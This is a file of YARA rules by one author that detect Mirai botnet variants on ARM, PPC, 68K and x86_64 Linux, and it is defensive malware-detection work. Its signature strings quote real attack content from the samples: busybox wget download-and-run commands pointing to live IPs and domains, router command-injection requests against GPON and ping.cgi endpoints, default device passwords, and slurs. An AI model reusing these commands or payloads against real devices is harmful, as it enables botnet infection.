rule Linux_ARM_Mirai_Variant_2022_03_16 {
    meta:
        description = "Detects new ARM Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-16"
        hash1 = "02814338c6e2d5bd1c1f729c7b03451df5e19023a96fc7acf7052174e17457b7"
    strings:
        $path1 = "/var/Kylin" wide ascii
        $path2 = "/var/Challenge" wide ascii
        $path3 = "/var/Sofia" wide ascii
        $path4 = "/GMHDVR" wide ascii
        $path5 = "/proc/net/tcp" wide ascii
        $path6 = "/anko-app/" wide ascii
        $pass1 = "a1sev5y7c39k" wide ascii
        $pass2 = "admin@123" wide ascii
        $pass3 = "HUAWEI" wide ascii
        $pass4 = "wuhanyatelan" wide ascii
        $pass5 = "ipcam_rt5350" wide ascii
        $pass6 = "QwestM0dem" wide ascii
        $botnet1 = "/bin/busybox BOTNET" wide ascii
        $botnet2 = "BOTNET: applet not found" wide ascii
        $botnet3 = "im stealing ur bots bro" wide ascii
        $botnet4 = "/bin/busybox wget -g 103.136.42.135 -l /tmp/skere -r /Cronmips; /bin/busybox chmod 777 * /tmp/skere; /tmp/skere huawei;rm rf Cronmips" wide ascii
    condition:
        uint16(0) == 0x457f and ((3 or all of ($path*)) and (4 or all of ($pass*)) and (2 or all of ($botnet*)))
}

rule Linux_ARM_Mirai_Weirdo_Variant_2022_03_16 {
    meta:
        description = "Detects new ARM Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-16"
        hash1 = "4e5aced627646ff9425802a256c80d6c8971c3daa4c329b83d9e96d492a8cecd"
    strings:
        $connection1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" wide ascii
        $connection2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" wide ascii
        $weird1 = "MELTEDNINJAREALZ" wide ascii
        $weird2 = "NiGGeRD0nks69" wide ascii
        $weird3 = "freecookiex86" wide ascii
        $weird4 = "NiGGeRD0nks69" wide ascii
        $weird5 = "1337SoraLOADER" wide ascii
        $weird6 = "SEXSLAVE1337" wide ascii
        $weird7 = "SoraBeReppin1337" wide ascii
        $weird8 = "ayyyGangShit" wide ascii
        $weird9 = "stresser.pw" wide ascii
        $pat1 = "/dev/null" wide ascii
        $pat2 = "/root/" wide ascii
        $pat3 = "/var/" wide ascii
        $pat4 = "/sys/devices/system/cpu" wide ascii
        $pat5 = "/proc/cpuinfo" wide ascii
    condition:
        uint16(0) == 0x457f and ((all of ($connection*)) and (4 or all of ($weird*)) and (3 or all of ($pat*)))
}

rule Linux_ARCH68K_Mirai_Variant_2022_03_15 {
    meta:
        description = "Detects new ARCH68K Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-15"
        hash1 = "0519f412cb9932cb961d9707d19a8cdeb61955a4587bd98d3de9b8be1059f7f1"
    strings:
        $request1 = "POST /GponForm/diag_Form?style/ HTTP/1.1" wide ascii
        $request2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" wide ascii
        $request3 = "GET /shell?cd+/tmp;rm+-rf+*;wget+ jswl.jdaili.xyz/jaws;sh+/tmp/jaws HTTP/1.1" wide ascii
        $request4 = "User-Agent: Hello, World" wide ascii
        $request5 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://209.141.33.141/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
        $request6 = "dslf-config" wide ascii
        $request7 = "/bin/busybox wget -g jswl.jdaili.xyz -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips" wide ascii
    condition:
        uint16(0) == 0x457f and (5 or all of ($request*))
}

rule Linux_PPC_Mirai_Variant_2022_03_18 {
    meta:
        description = "Detects new ARM Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-18"
        hash1 = "06e3d1eaaacf8bd63daedb8f112a9ec9f6bd3cd637808c4f564001869cad0f40"
    strings:
        $reqstr1 = "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://104.244.77.57/bins/Rakitin.mips%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&sessionKey=1039230114'$ HTTP/1.1" wide ascii
        $reqstr2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.162.98/bins/Rakitin.sh+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
        $reqstr3 = "45.90.162.98" wide ascii
    condition:
        uint16(0) == 0x457f and (3 or all of ($reqstr*))
}

rule Linux_ARM_Mirai_Variant_2022_03_17 {
    meta:
        description = "Detects new ARM Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-17"
        hash1 = "076e87c238d07821243660feb692c96dee92569be3e2867e6b46e7cb5a6593ef"
    strings:
        $useragent1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)" wide ascii
        $useragent2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" wide ascii
        $useragent3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00" wide ascii
        $useragent4 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" wide ascii
        $useragent5 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51" wide ascii
        $useragent6 = "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16" wide ascii
        $strw1 = /RyMGang/ nocase
        $strw2 = "TSource Engine Query" wide ascii
        $reqq1 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1" wide ascii
        $pa1 = "/proc/net/route" wide ascii
        $pa2 = "/usr/bin/python" wide ascii
        $pa3 = "/usr/sbin/dropbear" wide ascii
        $pa4 = "/etc/hosts" wide ascii
        $pa5 = "/etc/config/hosts" wide ascii
        $pa6 = "/etc/config/resolv.conf" wide ascii
        $pa7 = "/etc/resolv.conf" wide ascii
        $debstr1 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" wide ascii
        $debstr2 = "/home/firmware/build/temp-armv4l/build-gcc/gcc" wide ascii
        $debstr3 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm" wide ascii
        $fst1 = "ieee754-df.S" wide ascii
        $fst2 = "lib1funcs.asm" wide ascii
    condition:
        uint16(0) == 0x457f and ((4 or all of ($useragent*)) and (all of ($strw*)) and (all of ($reqq1)) and (5 or all of ($pa*)) and (all of ($debstr*)) and (all of ($fst*)))
}

rule Linux_x86_64_Mirai_shellcode_Variant_2022_03_17 {
    meta:
        description = "Detects new x86_64 Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-17"
        hash1 = "220935a9c5f6de63ef0d7c63e6f9ba3033e962854ca1911e770de2578d3d7e35"
    strings:
        $mstr1 = "142.93.140.12:23" wide ascii
        $mstr2 = "[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]" wide ascii
        $mstr3 = "been_there_done_that.3160" wide ascii
        $mstr4 = "Sending TCP Packets To: %s:%d for %d seconds" wide ascii
        $ppp1 = "/etc/apt/apt.conf" wide ascii
        $ppp2 = "/etc/yum.conf" wide ascii
    condition:
        uint16(0) == 0x457f and ((3 or all of ($mstr*)) and (all of ($ppp*)))
}